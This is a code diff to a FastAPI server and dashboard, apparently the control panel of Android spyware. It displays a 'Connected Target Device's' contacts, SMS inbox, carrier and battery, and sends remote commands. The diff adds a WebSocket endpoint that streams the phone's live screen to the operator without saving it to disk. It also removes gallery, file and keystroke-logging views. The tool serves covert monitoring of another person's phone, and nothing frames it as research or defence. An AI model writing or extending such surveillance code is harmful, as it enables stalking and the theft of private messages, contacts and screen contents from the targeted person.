@@ -34,7 +34,7 @@ class ConnectionManager:
 
 manager = ConnectionManager()
 
-# 1. Android App WebSocket Endpoint
+# 1. Android App Telemetry WebSocket Endpoint
 @app.websocket("/ws/device/{device_id}")
 async def device_websocket(websocket: WebSocket, device_id: str):
     await manager.connect_device(device_id, websocket)
@@ -59,7 +59,20 @@ async def admin_websocket(websocket: WebSocket):
     except WebSocketDisconnect:
         manager.disconnect_admin()
 
-# 3. Full NEXUS UI HTML Template
+# 3. Live Video Streaming WebSocket Endpoint (Zero Saving / In-Memory Stream)
+@app.websocket("/ws/stream")
+async def stream_endpoint(websocket: WebSocket):
+    await websocket.accept()
+    try:
+        while True:
+            frame_data = await websocket.receive_text()
+            # Disk-la save panrathu illai! Direct-ah admin dashboard-ku live video frame-a relay panrom
+            if manager.admin:
+                await manager.admin.send_json({"type": "live_video_frame", "frame": frame_data})
+    except WebSocketDisconnect:
+        pass
+
+# 4. Full NEXUS UI HTML Template
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -217,7 +230,6 @@ body::before{
   box-shadow:0 18px 40px -20px rgba(34,211,238,.4)}
 .device-card.selected{border-color:rgba(34,211,238,.55);
   box-shadow:0 0 0 1px rgba(34,211,238,.25),0 18px 40px -20px rgba(34,211,238,.4)}
-.device-card.offline{opacity:.55}
 .dc-top{display:flex;align-items:center;gap:12px;margin-bottom:16px}
 .dc-ico{width:38px;height:38px;border-radius:11px;display:grid;place-items:center;font-size:16px;
   background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25)}
@@ -225,7 +237,6 @@ body::before{
 .dc-meta p{font-size:11px;color:var(--dim);margin-top:2px}
 .dot{width:8px;height:8px;border-radius:50%;margin-left:auto}
 .dot.online{background:var(--green);box-shadow:0 0 10px var(--green)}
-.dot.offline{background:#4b5563}
 .dc-bat{display:flex;align-items:center;gap:10px;margin-bottom:14px}
 .bar{flex:1;height:6px;border-radius:6px;background:#1a2130;overflow:hidden}
 .bar i{display:block;height:100%;border-radius:6px;transition:width .5s}
@@ -234,7 +245,7 @@ body::before{
   border-top:1px solid var(--line)}
 .dc-info label{display:block;font-size:9.5px;color:var(--dim);letter-spacing:.08em;text-transform:uppercase;margin-bottom:3px}
 .dc-info b{font-size:11.5px;font-weight:600;font-variant-numeric:tabular-nums}
-.dc-info b.ok{color:var(--red)} .dc-info b.no{color:var(--green)}
+.dc-info b.no{color:var(--green)}
 
 /* ============ FEED ============ */
 .feed{display:flex;flex-direction:column;gap:2px;padding:6px 0}
@@ -253,7 +264,6 @@ body::before{
   background:rgba(255,255,255,.03);border:1px solid var(--line);color:var(--txt);outline:none;
 }
 .input:focus{border-color:rgba(34,211,238,.45);box-shadow:0 0 0 3px rgba(34,211,238,.08)}
-.input::placeholder{color:#4d5766}
 .contacts{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:12px}
 .contact{
   display:flex;align-items:center;gap:13px;padding:14px;border-radius:14px;cursor:pointer;
@@ -266,9 +276,6 @@ body::before{
   font-size:13px;font-weight:700;color:#04121a;
   background:linear-gradient(135deg,var(--cyan),var(--violet));
 }
-.c-ava.alt{background:linear-gradient(135deg,#f59e0b,#ef4444)}
-.c-ava.alt2{background:linear-gradient(135deg,#22c55e,#0ea5e9)}
-.c-info{min-width:0}
 .c-info h4{font-size:13.5px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
 .c-info p{font-size:11.5px;color:var(--dim);font-variant-numeric:tabular-nums;margin-top:2px}
 .c-tag{margin-left:auto;font-size:9.5px;padding:4px 9px;border-radius:20px;letter-spacing:.06em;
@@ -284,21 +291,11 @@ body::before{
 .convo:hover{background:rgba(255,255,255,.04)}
 .convo.active{background:linear-gradient(90deg,rgba(34,211,238,.12),rgba(139,92,246,.08));
   border:1px solid rgba(34,211,238,.25)}
-.convo .c-info h4{font-size:13px}
-.convo .c-info p{font-size:11.5px;color:var(--dim);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:150px}
-.convo-meta{margin-left:auto;text-align:right;flex-shrink:0}
-.convo-meta small{font-size:10px;color:#525d6d;display:block}
-.unread{margin-top:4px;display:inline-grid;place-items:center;min-width:18px;height:18px;padding:0 5px;
-  border-radius:9px;font-size:10px;font-weight:700;color:#04121a;
-  background:linear-gradient(135deg,var(--cyan),var(--violet))}
 .chat{display:flex;flex-direction:column;overflow:hidden}
 .chat-head{padding:16px 20px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:12px}
 .chat-body{flex:1;overflow-y:auto;padding:20px;display:flex;flex-direction:column;gap:10px}
 .bubble{max-width:70%;padding:11px 15px;border-radius:14px;font-size:12.8px;line-height:1.5}
-.bubble.them{align-self:flex-start;background:rgba(255,255,255,.055);border:1px solid var(--line);
-  border-bottom-left-radius:5px}
-.bubble.me{align-self:flex-end;color:#04121a;font-weight:500;
-  background:linear-gradient(135deg,var(--cyan),#4dd0f0);border-bottom-right-radius:5px}
+.bubble.them{align-self:flex-start;background:rgba(255,255,255,.055);border:1px solid var(--line);border-bottom-left-radius:5px}
 .bubble time{display:block;font-size:9.5px;opacity:.55;margin-top:4px}
 .chat-input{padding:14px 16px;border-top:1px solid var(--line);display:flex;gap:10px}
 
@@ -306,14 +303,11 @@ body::before{
 .detail-grid{display:grid;grid-template-columns:1fr 340px;gap:14px}
 .info-list{padding:6px 0}
 .info-row{display:flex;justify-content:space-between;align-items:center;padding:13px 20px;font-size:12.5px}
-.info-row:hover{background:rgba(255,255,255,.025)}
 .info-row+.info-row{border-top:1px solid rgba(255,255,255,.04)}
 .info-row span{color:var(--dim)}
 .info-row b{font-weight:600;font-variant-numeric:tabular-nums}
 .pill{font-size:10.5px;padding:3px 10px;border-radius:20px;font-weight:700;letter-spacing:.04em}
 .pill.g{color:var(--green);background:rgba(34,197,94,.12);border:1px solid rgba(34,197,94,.25)}
-.pill.r{color:var(--red);background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.25)}
-.pill.y{color:var(--amber);background:rgba(245,158,11,.12);border:1px solid rgba(245,158,11,.25)}
 
 .ring-wrap{padding:22px;display:flex;flex-direction:column;align-items:center;gap:14px}
 .ring{
@@ -325,104 +319,6 @@ body::before{
 .ring-in b{font-size:26px;font-weight:700;letter-spacing:-.02em}
 .ring-in small{display:block;font-size:10px;color:var(--dim);letter-spacing:.1em;text-transform:uppercase}
 
-.map{
-  height:190px;border-radius:14px;position:relative;overflow:hidden;
-  background:
-    linear-gradient(rgba(34,211,238,.05) 1px,transparent 1px) 0 0/26px 26px,
-    linear-gradient(90deg,rgba(34,211,238,.05) 1px,transparent 1px) 0 0/26px 26px,
-    radial-gradient(circle at 50% 55%,#101a24,#080c11);
-  border:1px solid var(--line);
-}
-.pin{position:absolute;top:52%;left:50%;transform:translate(-50%,-50%)}
-.pin::before{content:"";position:absolute;width:52px;height:52px;border-radius:50%;
-  border:2px solid rgba(34,211,238,.5);left:50%;top:50%;transform:translate(-50%,-50%);
-  animation:ripple 2.2s infinite}
-@keyframes ripple{0%{transform:translate(-50%,-50%) scale(.4);opacity:.9}
-  100%{transform:translate(-50%,-50%) scale(1.6);opacity:0}}
-.pin-dot{width:14px;height:14px;border-radius:50%;background:var(--cyan);
-  box-shadow:0 0 16px var(--cyan);position:relative;z-index:1}
-
-/* ============ GALLERY ============ */
-.tabs{display:flex;gap:6px;margin-bottom:16px}
-.tab{padding:8px 16px;border-radius:9px;font-size:12px;font-weight:600;cursor:pointer;
-  border:1px solid var(--line);background:transparent;color:var(--dim);font-family:inherit;transition:.18s}
-.tab.active{background:rgba(34,211,238,.12);border-color:rgba(34,211,238,.35);color:var(--cyan)}
-.grid-media{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:10px}
-.media{
-  aspect-ratio:1;border-radius:13px;position:relative;overflow:hidden;cursor:pointer;
-  border:1px solid var(--line);transition:.2s;display:grid;place-items:center;
-}
-.media:hover{transform:scale(1.03);border-color:rgba(34,211,238,.4)}
-.media::after{content:"";position:absolute;inset:0;
-  background:linear-gradient(180deg,transparent 45%,rgba(0,0,0,.75))}
-.media .lbl{position:absolute;bottom:9px;left:11px;right:11px;font-size:10.5px;
-  color:#c9d4e3;z-index:2;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
-.media .play{position:absolute;z-index:2;width:38px;height:38px;border-radius:50%;
-  background:rgba(0,0,0,.55);backdrop-filter:blur(6px);border:1px solid rgba(255,255,255,.25);
-  display:grid;place-items:center;font-size:13px;color:#fff}
-.media .dur{position:absolute;top:9px;right:10px;z-index:2;font-size:9.5px;padding:2px 7px;
-  border-radius:6px;background:rgba(0,0,0,.65);color:#dbe4f0}
-
-/* ============ FILES ============ */
-.file-row{
-  display:grid;grid-template-columns:32px 1fr 110px 130px 40px;align-items:center;gap:14px;
-  padding:13px 18px;font-size:12.5px;transition:.15s;cursor:pointer;
-}
-.file-row:hover{background:rgba(255,255,255,.03)}
-.file-row+.file-row{border-top:1px solid rgba(255,255,255,.04)}
-.file-head{font-size:10px;letter-spacing:.1em;text-transform:uppercase;color:#525d6d;
-  padding:12px 18px;border-bottom:1px solid var(--line);font-weight:700}
-.f-ico{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;font-size:13px;
-  background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.16)}
-.f-name{font-weight:500}
-.f-dim{color:var(--dim);font-variant-numeric:tabular-nums;font-size:11.5px}
-.f-more{color:#3d4653;text-align:center;font-size:16px}
-
-/* ============ SCREEN MIRROR ============ */
-.mirror-wrap{display:grid;grid-template-columns:1fr 300px;gap:20px;align-items:start}
-.mirror-stage{display:flex;justify-content:center;padding:26px;border-radius:16px;
-  border:1px solid var(--line);
-  background:radial-gradient(circle at 50% 30%,rgba(34,211,238,.07),transparent 65%),#0a0e14}
-.phone{
-  width:250px;height:500px;border-radius:38px;padding:9px;position:relative;
-  background:linear-gradient(160deg,#232b3a,#0e131b);
-  border:1px solid rgba(255,255,255,.1);
-  box-shadow:0 40px 80px -30px rgba(0,0,0,.9),0 0 50px -20px rgba(34,211,238,.5);
-}
-.phone::before{content:"";position:absolute;top:16px;left:50%;transform:translateX(-50%);
-  width:74px;height:7px;border-radius:6px;background:#0a0d12;z-index:5}
-.phone-screen{
-  width:100%;height:100%;border-radius:30px;overflow:hidden;position:relative;
-  background:linear-gradient(160deg,#152238,#0b1220 55%,#131024);
-}
-.ps-status{display:flex;justify-content:space-between;padding:16px 20px 0;font-size:10px;
-  color:#c3cede;font-weight:600;position:relative;z-index:2}
-.ps-wall{position:absolute;inset:0;
-  background:
-    radial-gradient(circle at 30% 20%,rgba(139,92,246,.55),transparent 55%),
-    radial-gradient(circle at 75% 70%,rgba(34,211,238,.45),transparent 55%);
-  filter:blur(6px)}
-.ps-time{position:relative;z-index:2;text-align:center;margin-top:64px}
-.ps-time b{font-size:46px;font-weight:200;letter-spacing:-.03em;color:#fff}
-.ps-time span{display:block;font-size:11px;color:#a9b6c8;letter-spacing:.1em;margin-top:2px}
-.ps-apps{position:absolute;bottom:26px;left:0;right:0;z-index:2;
-  display:grid;grid-template-columns:repeat(4,1fr);gap:14px 8px;padding:0 22px}
-.ps-app{aspect-ratio:1;border-radius:13px;background:rgba(255,255,255,.14);
-  border:1px solid rgba(255,255,255,.18);backdrop-filter:blur(6px)}
-.ps-app:nth-child(2){background:linear-gradient(135deg,rgba(34,211,238,.65),rgba(14,165,233,.5))}
-.ps-app:nth-child(5){background:linear-gradient(135deg,rgba(139,92,246,.65),rgba(236,72,153,.5))}
-.ps-app:nth-child(7){background:linear-gradient(135deg,rgba(34,197,94,.6),rgba(16,185,129,.5))}
-.scan{position:absolute;left:0;right:0;height:70px;z-index:3;pointer-events:none;
-  background:linear-gradient(180deg,transparent,rgba(34,211,238,.12),transparent);
-  animation:scan 3.4s linear infinite}
-@keyframes scan{0%{top:-70px}100%{top:100%}}
-.live-badge{display:inline-flex;align-items:center;gap:7px;font-size:10.5px;font-weight:700;
-  letter-spacing:.1em;color:var(--red);padding:6px 12px;border-radius:20px;
-  background:rgba(239,68,68,.12);border:1px solid rgba(239,68,68,.3)}
-.live-badge i{width:6px;height:6px;border-radius:50%;background:var(--red);
-  box-shadow:0 0 8px var(--red);animation:pulse 1.2s infinite}
-.side-panel{padding:20px}
-
 /* ============ CONTROLS ============ */
 .controls{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:14px}
 .ctrl{
@@ -432,52 +328,16 @@ body::before{
 }
 .ctrl:hover{border-color:rgba(34,211,238,.3);transform:translateY(-2px)}
 .ctrl-ico{width:44px;height:44px;border-radius:13px;display:grid;place-items:center;font-size:19px;
-  background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25);flex-shrink:0;transition:.2s}
-.ctrl.on .ctrl-ico{background:rgba(34,211,238,.16);border-color:rgba(34,211,238,.5);
-  box-shadow:0 0 20px rgba(34,211,238,.35)}
+  background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25);flex-shrink:0}
 .ctrl-txt{flex:1;min-width:0}
 .ctrl-txt h4{font-size:13px;font-weight:600}
 .ctrl-txt p{font-size:11px;color:var(--dim);margin-top:3px}
-.switch{
-  width:44px;height:25px;border-radius:20px;background:#1a2130;position:relative;flex-shrink:0;
-  border:1px solid var(--line);cursor:pointer;transition:.22s;
-}
-.switch::after{content:"";position:absolute;width:17px;height:17px;border-radius:50%;
-  background:#5b6676;top:3px;left:3px;transition:.22s}
-.ctrl.on .switch{background:linear-gradient(135deg,var(--cyan),var(--violet));border-color:transparent}
-.ctrl.on .switch::after{left:22px;background:#fff}
 .mini-btn{
   padding:7px 12px;border-radius:9px;font-size:11px;font-weight:600;cursor:pointer;
   font-family:inherit;color:var(--txt);background:rgba(255,255,255,.05);
   border:1px solid var(--line);transition:.18s;flex-shrink:0;
 }
 .mini-btn:hover{background:rgba(34,211,238,.15);border-color:rgba(34,211,238,.4);color:var(--cyan)}
-
-/* ============ KEYSTROKES ============ */
-.krow{display:grid;grid-template-columns:32px 1fr auto;gap:12px;padding:13px 18px;align-items:start}
-.krow:hover{background:rgba(255,255,255,.03)}
-.krow+.krow{border-top:1px solid rgba(255,255,255,.04)}
-.k-app{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;font-size:13px;
-  background:rgba(34,211,238,.08);border:1px solid rgba(34,211,238,.16)}
-.k-body{min-width:0}
-.k-win{font-size:11px;color:var(--dim);margin-bottom:5px;white-space:nowrap;
-  overflow:hidden;text-overflow:ellipsis}
-.k-text{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;font-size:11.8px;
-  color:#bfe6f5;background:rgba(34,211,238,.055);border:1px solid rgba(34,211,238,.14);
-  border-radius:7px;padding:6px 10px;display:inline-block;max-width:100%;
-  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;vertical-align:bottom}
-.caret{display:inline-block;width:1px;height:11px;background:var(--cyan);margin-left:3px;
-  vertical-align:-1px;animation:blink 1.1s steps(1) infinite}
-@keyframes blink{50%{opacity:0}}
-.k-time{font-size:10.5px;color:#525d6d;font-variant-numeric:tabular-nums;
-  white-space:nowrap;padding-top:2px}
-.mini-bar{height:6px;border-radius:6px;background:#1a2130;overflow:hidden;margin-top:7px}
-.mini-bar i{display:block;height:100%;border-radius:6px;
-  background:linear-gradient(90deg,var(--cyan),var(--violet))}
-.app-stat{margin-bottom:15px}
-.app-stat:last-child{margin-bottom:0}
-.app-stat-top{display:flex;justify-content:space-between;font-size:11.5px}
-.app-stat-top span{color:var(--dim)}
 
 /* ============ TOAST ============ */
 .toasts{position:fixed;bottom:24px;right:24px;display:flex;flex-direction:column;gap:10px;z-index:99}
@@ -490,19 +350,12 @@ body::before{
 .toast i{width:7px;height:7px;border-radius:50%;background:var(--cyan);
   box-shadow:0 0 10px var(--cyan);flex-shrink:0}
 @keyframes slideIn{from{opacity:0;transform:translateX(40px)}to{opacity:1;transform:none}}
-
-@media(max-width:1080px){
-  .app{grid-template-columns:76px 1fr}
-  .brand-text,.nav-item span,.side-foot .side-user>div:last-child{display:none}
-  .nav-item{justify-content:center;padding:13px}
-  .detail-grid,.msg-wrap,.mirror-wrap{grid-template-columns:1fr}
-}
 </style>
 </head>
 <body>
 
 <div class="app">
-  <!-- ================= SIDEBAR ================= -->
+  <!-- SIDEBAR -->
   <aside class="sidebar">
     <div class="brand">
       <div class="brand-mark">N</div>
@@ -526,18 +379,6 @@ body::before{
         <svg viewBox="0 0 24 24"><rect x="6" y="2" width="12" height="20" rx="3"/><path d="M10.5 18h3"/></svg>
         <span>Device</span>
       </button>
-      <button class="nav-item" data-view="gallery">
-        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="2.5"/><circle cx="8.5" cy="8.5" r="1.6"/><path d="M21 15.5l-5-5L5 21"/></svg>
-        <span>Gallery</span>
-      </button>
-      <button class="nav-item" data-view="files">
-        <svg viewBox="0 0 24 24"><path d="M3 7a2 2 0 0 1 2-2h4l2 2h8a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/></svg>
-        <span>Files</span>
-      </button>
-      <button class="nav-item" data-view="keylog">
-        <svg viewBox="0 0 24 24"><rect x="2" y="6" width="20" height="12" rx="2.5"/><path d="M6 10h.01M10 10h.01M14 10h.01M18 10h.01M6 14h.01M18 14h.01M9.5 14h5"/></svg>
-        <span>Keystrokes</span>
-      </button>
       <button class="nav-item" data-view="screen">
         <svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="13" rx="2.5"/><path d="M8 21h8M12 17v4"/></svg>
         <span>Screen</span>
@@ -557,7 +398,7 @@ body::before{
     </div>
   </aside>
 
-  <!-- ================= MAIN ================= -->
+  <!-- MAIN -->
   <main class="main">
     <header class="topbar">
       <div class="tb-left">
@@ -572,8 +413,7 @@ body::before{
     </header>
 
     <div class="views">
-
-      <!-- ---------- DASHBOARD ---------- -->
+      <!-- DASHBOARD VIEW -->
       <section class="view active" id="v-dashboard">
         <div class="stats">
           <div class="stat"><div class="stat-ico">📶</div><div>
@@ -586,10 +426,7 @@ body::before{
             <div class="stat-k">Alerts</div><div class="stat-v">0<span>new</span></div></div></div>
         </div>
 
-        <div class="sec-head">
-          <h2>Connected Target Device</h2>
-          <button class="btn ghost" onclick="toast('Device synced')">Refresh</button>
-        </div>
+        <div class="sec-head"><h2>Connected Target Device</h2></div>
         <div class="devices" id="deviceGrid">
           <article class="device-card selected" data-id="d1">
             <div class="dc-top">
@@ -616,7 +453,7 @@ body::before{
         </div>
       </section>
 
-      <!-- ---------- CONTACTS ---------- -->
+      <!-- CONTACTS VIEW -->
       <section class="view" id="v-contacts">
         <div class="toolbar">
           <input class="input" id="contactSearch" placeholder="Search live contacts...">
@@ -627,7 +464,7 @@ body::before{
         </div>
       </section>
 
-      <!-- ---------- MESSAGES ---------- -->
+      <!-- MESSAGES VIEW -->
       <section class="view" id="v-messages">
         <div class="msg-wrap">
           <div class="card convos" id="convoList">
@@ -641,15 +478,11 @@ body::before{
             <div class="chat-body" id="chatBody">
               <div style="color:var(--dim);text-align:center;margin-top:40px">Select a conversation from the left</div>
             </div>
-            <div class="chat-input">
-              <input class="input" id="msgInput" placeholder="Type a message...">
-              <button class="btn grad" onclick="toast('Command queued')">Send</button>
-            </div>
           </div>
         </div>
       </section>
 
-      <!-- ---------- DEVICE ---------- -->
+      <!-- DEVICE VIEW -->
       <section class="view" id="v-device">
         <div class="detail-grid">
           <div class="card">
@@ -661,40 +494,33 @@ body::before{
               <div class="info-row"><span>Status</span><b>Awaiting telemetry...</b></div>
             </div>
           </div>
-
-          <div style="display:flex;flex-direction:column;gap:14px">
-            <div class="card ring-wrap">
-              <div class="ring"><div class="ring-in"><b id="ringPct">--%</b><small>Battery</small></div></div>
-              <div style="text-align:center;font-size:11.5px;color:var(--dim)" id="ringSub">
-                Live Monitoring
-              </div>
-            </div>
+          <div class="card ring-wrap">
+            <div class="ring"><div class="ring-in"><b id="ringPct">--%</b><small>Battery</small></div></div>
+            <div style="text-align:center;font-size:11.5px;color:var(--dim)" id="ringSub">Live Monitoring</div>
           </div>
         </div>
       </section>
 
-      <!-- ---------- CONTROLS ---------- -->
+      <!-- SCREEN STREAM VIEW -->
+      <section class="view" id="v-screen">
+        <div class="sec-head" style="margin-top:0"><h2>Live Screen Stream (Zero Saving)</h2></div>
+        <div class="card" style="padding:20px;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:400px;">
+          <img id="liveScreenImg" style="max-width:100%;max-height:500px;border-radius:12px;border:1px solid var(--line);background:#000;" alt="Waiting for live screen stream..."/>
+          <div style="margin-top:14px;font-size:12px;color:var(--dim);" id="streamStatus">Status: Connecting to live stream...</div>
+        </div>
+      </section>
+
+      <!-- CONTROLS VIEW -->
       <section class="view" id="v-controls">
         <div class="sec-head" style="margin-top:0"><h2>Remote Controls</h2></div>
         <div class="controls">
-          <div class="ctrl" onclick="sendControl('flashlight')">
-            <div class="ctrl-ico">🔦</div>
-            <div class="ctrl-txt"><h4>Flashlight</h4><p>Toggle rear LED</p></div>
-            <button class="mini-btn">Toggle</button>
-          </div>
           <div class="ctrl" onclick="sendControl('vibration')">
             <div class="ctrl-ico">📳</div>
             <div class="ctrl-txt"><h4>Vibration</h4><p>Trigger vibrator motor</p></div>
             <button class="mini-btn">Trigger</button>
           </div>
-          <div class="ctrl" onclick="sendControl('reboot')">
-            <div class="ctrl-ico">♻</div>
-            <div class="ctrl-txt"><h4>Reboot</h4><p>Restart target device</p></div>
-            <button class="mini-btn" style="color:var(--red);border-color:rgba(239,68,68,.3)">Reboot</button>
-          </div>
         </div>
       </section>
-
     </div>
   </main>
 </div>
@@ -714,7 +540,6 @@ function toast(msg){
     el.style.transition='.3s'; setTimeout(()=>el.remove(),300); }, 2600);
 }
 
-// Navigation switcher
 $$('.nav-item').forEach(btn=>{
   btn.addEventListener('click',()=>{
     $$('.nav-item').forEach(b=>b.classList.remove('active'));
@@ -731,7 +556,7 @@ setInterval(()=>{
   $('#clock').textContent = new Date().toLocaleTimeString('en-GB');
 },1000);
 
-// ================= LIVE WEBSOCKET CONNECTION =================
+// Admin WebSocket Connection for Telemetry & Controls
 const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
 const wsUrl = protocol + window.location.host + '/ws/admin';
 const ws = new WebSocket(wsUrl);
@@ -741,26 +566,21 @@ ws.onclose = () => { toast("Disconnected from server"); };
 
 ws.onmessage = (event) => {
   const message = JSON.parse(event.data);
-  const payload = message.payload;
-
-  if(payload.type === "live_sync") {
-    // 1. Dashboard Stats Update
+  
+  // Handle Telemetry Sync
+  if(message.payload && message.payload.type === "live_sync") {
+    const payload = message.payload;
     $('#statBattery').innerHTML = payload.battery + '<span>%</span>';
     $('#statCarrier').textContent = payload.carrier;
-    
-    // 2. Device Card Update
     $('#cardDevName').textContent = payload.model;
     $('#cardDevModel').textContent = `Android ${payload.os} · ${payload.brand}`;
     $('#cardBatBar').style.width = payload.battery + '%';
-    $('#cardBatText.textContent = payload.battery + '%';
+    $('#cardBatText').textContent = payload.battery + '%';
     $('#cardCarrier').textContent = payload.carrier;
     $('#cardOs').textContent = payload.os;
-
-    // 3. Ring Battery Update
     $('#ringPct').textContent = payload.battery + '%';
     $('#ringSub').textContent = `Carrier: ${payload.carrier} · OS: ${payload.os}`;
 
-    // 4. Device Information Tab Rows
     const rows = [
       ['Device Model', payload.model],
       ['Brand', payload.brand],
@@ -770,7 +590,6 @@ ws.onmessage = (event) => {
     ];
     $('#infoList').innerHTML = rows.map(([k,v])=>`<div class="info-row"><span>${k}</span><b>${v}</b></div>`).join('');
 
-    // 5. Populate Live Contacts
     if(payload.contacts && payload.contacts.length > 0) {
       $('#contactGrid').innerHTML = payload.contacts.map(c=>`
         <div class="contact">
@@ -780,31 +599,21 @@ ws.onmessage = (event) => {
         </div>`).join('');
     }
 
-    // 6. Populate Live SMS / Messages Inbox
     if(payload.sms && payload.sms.length > 0) {
-      $('#convoList').innerHTML = payload.sms.map((s, idx)=>`
-        <div class="convo" onclick="selectSmsThread('${s.sender}', '${s.message}')">
+      $('#convoList').innerHTML = payload.sms.map((s)=>`
+        <div class="convo">
           <div class="c-ava">${s.sender[0]}</div>
           <div class="c-info"><h4>${s.sender}</h4><p>${s.message}</p></div>
         </div>`).join('');
     }
+  }
 
-    // 7. Add to Live Activity Feed
-    const feedItem = `<div class="feed-item"><div class="fi">📱</div>
-      <div><b>${payload.model}</b> <span>— Live sync received (Battery: ${payload.battery}%, Net: ${payload.carrier})</span></div><time>Just now</time></div>`;
-    $('#liveFeed').insertAdjacentHTML('afterbegin', feedItem);
-
-    toast("Live telemetry updated from target!");
+  // Handle Live Video Frame Stream
+  if(message.type === "live_video_frame") {
+    $('#liveScreenImg').src = "data:image/jpeg;base64," + message.frame;
+    $('#streamStatus').textContent = "Status: Streaming live frames (Zero saving)";
   }
 };
-
-function selectSmsThread(sender, msg) {
-  $('#chatHead').innerHTML = `
-    <div class="c-ava">SMS</div>
-    <div><div style="font-size:13.5px;font-weight:600">${sender}</div>
-    <div style="font-size:11px;color:var(--dim)">Live SMS Thread</div></div>`;
-  $('#chatBody').innerHTML = `<div class="bubble them">${msg}<time>Live</time></div>`;
-}
 
 function sendControl(action) {
   ws.send(JSON.stringify({ device_id: "pixel_7_pro", action: action }));
